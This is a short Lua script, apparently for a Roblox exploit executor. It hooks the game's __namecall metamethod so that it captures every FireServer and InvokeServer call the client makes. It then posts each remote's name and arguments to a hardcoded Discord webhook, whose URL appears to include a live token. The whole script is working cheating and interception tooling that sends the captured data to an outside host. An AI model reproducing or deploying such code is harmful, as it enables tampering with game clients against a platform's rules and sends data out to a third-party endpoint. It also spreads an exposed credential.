local WH = "https://discord.com/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
local http = (request or http_request or (http and http.request))
local hook = hookmetamethod

-- Mutex flag to prevent the script from logging its own webhook traffic
local isLogging = false 

local function sendToDiscord(remoteName, method, args)
    if isLogging then return end
    isLogging = true

    -- Convert arguments table to a readable string
    local argData = ""
    for i, v in pairs(args) do
        argData = argData .. "\n[" .. i .. "] (" .. typeof(v) .. "): " .. tostring(v)
    end
    
    if argData == "" then argData = "No Arguments" end

    task.spawn(function()
        pcall(function()
            http({
                Url = WH,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    ["embeds"] = {{
                        ["title"] = "📤 Outgoing Data Captured",
                        ["color"] = 0xFF5555, -- Red for Outgoing
                        ["fields"] = {
                            {["name"] = "Remote Name", ["value"] = "`" .. remoteName .. "`", ["inline"] = true},
                            {["name"] = "Method", ["value"] = "`" .. method .. "`", ["inline"] = true},
                            {["name"] = "Arguments Sent", ["value"] = "```lua" .. argData .. "
```"}
                        },
                        ["footer"] = {["text"] = "Timestamp: " .. os.date("%X")}
                    }}
                })
            })
        end)
        task.wait(0.2)
        isLogging = false
    end)
end

-- Hooking the 'gate' where all client-to-server data passes
local old
old = hook(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    -- Filter: Only capture data being SENT to the server
    if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
        sendToDiscord(self.Name, method, args)
    end

    return old(self, ...)
end)

print("✅ Logging Outgoing Traffic Only.")
